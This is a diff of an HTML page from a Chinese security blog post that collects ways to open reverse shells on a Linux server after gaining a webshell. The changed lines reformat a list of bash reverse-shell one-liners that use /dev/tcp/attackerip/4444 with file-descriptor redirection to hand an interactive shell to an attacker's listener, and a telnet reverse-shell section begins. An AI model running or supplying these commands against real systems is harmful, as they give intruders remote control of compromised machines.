@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="Brucetg&#39;s Blog">
 <meta property="og:description" content="在渗透过程中，在拿到webshell后，如果目标主机是Linux服务器，一般我们都会选择反弹shell以方便后续操作，在此总结下反弹shell的几种姿势。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-05-03T13:57:52.876Z">
+<meta property="og:updated_time" content="2018-05-03T14:04:33.007Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="多种姿势反弹shell">
 <meta name="twitter:description" content="在渗透过程中，在拿到webshell后，如果目标主机是Linux服务器，一般我们都会选择反弹shell以方便后续操作，在此总结下反弹shell的几种姿势。">
@@ -214,14 +214,12 @@
 <li><p>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</p>
 <p>另外由于不同Linux发行版之间的差异，该命令在某些系统上可能并不适用。</p>
 <p><strong>其他版本：</strong></p>
-<ol>
-<li><p>exec /bin/bash 0&amp;0 2&gt;&amp;0</p>
-</li>
-<li><p>0&lt;&196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</p>
-</li>
-<li><p>exec 5&lt;&gt;/dev/tcp/attackerip/4444cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done  # or:while read line 0&lt;&5; do $line 2&gt;&amp;5 &gt;&5; done</p>
-</li>
-</ol>
+<p>方法一：</p>
+<p>exec /bin/bash 0&amp;0 2&gt;&amp;0</p>
+<p>方法二：</p>
+<p>0&lt;&196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</p>
+<p>方法三：</p>
+<p>exec 5&lt;&gt;/dev/tcp/attackerip/4444cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done  # 或者: while read line 0&lt;&5; do $line 2&gt;&amp;5 &gt;&5; done</p>
 </li>
 </ol>
 <h2 id="0x02-telnet反弹"><a href="#0x02-telnet反弹" class="headerlink" title="0x02. telnet反弹"></a>0x02. telnet反弹</h2><p>  攻击者主机上打开两个终端分别执行监听：</p>
